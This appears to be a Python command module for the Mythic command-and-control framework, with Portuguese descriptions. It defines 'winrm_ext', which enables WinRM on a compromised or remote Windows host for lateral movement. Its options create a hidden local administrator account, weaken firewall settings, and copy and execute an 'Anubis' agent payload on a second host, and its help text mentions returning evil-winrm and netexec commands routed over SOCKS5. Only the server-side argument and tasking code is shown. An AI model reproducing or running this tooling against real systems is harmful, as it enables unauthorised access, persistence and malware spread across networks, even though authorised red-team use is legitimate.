from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import json


class WinrmExtArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(name="remote", type=ParameterType.String,
                             required=False, default_value="",
                             description="IP do HOST-B a configurar via lateral movement a partir do agente. Vazio = self-host"),
            CommandParameter(name="target", type=ParameterType.String,
                             required=False, default_value="",
                             description="IP/hostname (self-host). Vazio = IP local do agente"),
            CommandParameter(name="port", type=ParameterType.Number,
                             required=False, default_value=5985,
                             description="Porta WinRM (5986 se ssl=True)"),
            CommandParameter(name="username", type=ParameterType.String,
                             required=False, default_value="",
                             description="Credencial (admin no alvo, p/ remote)"),
            CommandParameter(name="password", type=ParameterType.String,
                             required=False, default_value="",
                             description="Senha"),
            CommandParameter(name="domain", type=ParameterType.String,
                             required=False, default_value="",
                             description="Domínio (ex: CORP). Vazio = conta local"),
            CommandParameter(name="socks_port", type=ParameterType.Number,
                             required=False, default_value=7005,
                             description="Porta do SOCKS5 no servidor Mythic"),
            CommandParameter(name="add_user", type=ParameterType.String,
                             required=False, default_value="",
                             description="Cria usuário local admin no alvo (self-host ou remote)"),
            CommandParameter(name="add_pass", type=ParameterType.String,
                             required=False, default_value="",
                             description="Senha do add_user. Vazio = senha aleatória gerada"),
            CommandParameter(name="ssl", type=ParameterType.Boolean,
                             required=False, default_value=False,
                             description="HTTPS (5986) — só no bootstrap via PSRemoting"),
            CommandParameter(name="action", type=ParameterType.String,
                             required=False, default_value="",
                             description="'cleanup' reverte configurações no alvo (local ou remoto)"),
            CommandParameter(name="deploy", type=ParameterType.String,
                             required=False, default_value="",
                             description="(com remote) caminho do payload do Anubis no HOST-A; copia e executa no HOST-B"),
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == "{":
                self.load_args_from_json_string(self.command_line)
            else:
                # estilo posicional: winrm_ext <target> <username> <password> <domain>
                parts = self.command_line.split()
                if len(parts) >= 1:
                    self.set_arg("target", parts[0])
                if len(parts) >= 2:
                    self.set_arg("username", parts[1])
                if len(parts) >= 3:
                    self.set_arg("password", parts[2])
                if len(parts) >= 4:
                    self.set_arg("domain", parts[3])
        else:
            raise ValueError("winrm_ext: use winrm_ext <target> <user> <pass> [domain] "
                             "ou JSON com remote/deploy.")

    async def parse_dictionary(self, dictionary):
        self.load_args_from_dictionary(dictionary)


class WinrmExtCommand(CommandBase):
    cmd = "winrm_ext"
    needs_admin = False
    help_cmd = ("winrm_ext [target] [username] [password] [domain]  |  "
                "winrm_ext {\"remote\":\"10.0.0.5\",\"username\":\"adm\","
                "\"password\":\"P@ss\",\"domain\":\"CORP\",\"deploy\":\"C:\\\\tmp\\\\anubis.exe\"}")
    description = ("Configura WinRM no host local (self-host) ou, com 'remote', "
                   "configura WinRM em outro host a partir do agente (lateral "
                   "movement) — opcionalmente implantando o payload do Anubis no alvo. "
                   "Retorna comandos evil-winrm/netexec via SOCKS5 do Mythic e "
                   "one-liners PSRemoting para rodar no próprio agente.")
    version = 2
    author = "@wtechsec"
    attackmapping = ["T1021.006", "T1090", "T1562.004", "T1136.001", "T1570"]
    argument_class = WinrmExtArguments
    attributes = CommandAttributes(
        supported_python_versions=["Python 3.8"],
        supported_os=[SupportedOS.Windows],
    )

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        remote = task.args.get_arg("remote") or ""
        deploy = task.args.get_arg("deploy") or ""
        target = task.args.get_arg("target") or ""
        if remote:
            task.display_params = "REMOTO %s:%s → deploy=%s" % (
                remote, task.args.get_arg("port"),
                os.path.basename(deploy) if deploy else "-")
        else:
            task.display_params = "self-host %s:%s" % (
                target or "<IP do agente>", task.args.get_arg("port"))
        return task

    async def process_response(self, response: AgentResponse):
        resp = await PTTaskProcessResponseMessageResponse(
            task_id=response.task.id,
            process_response="standard",
            response=response.response,
        ).to_json()
        return resp
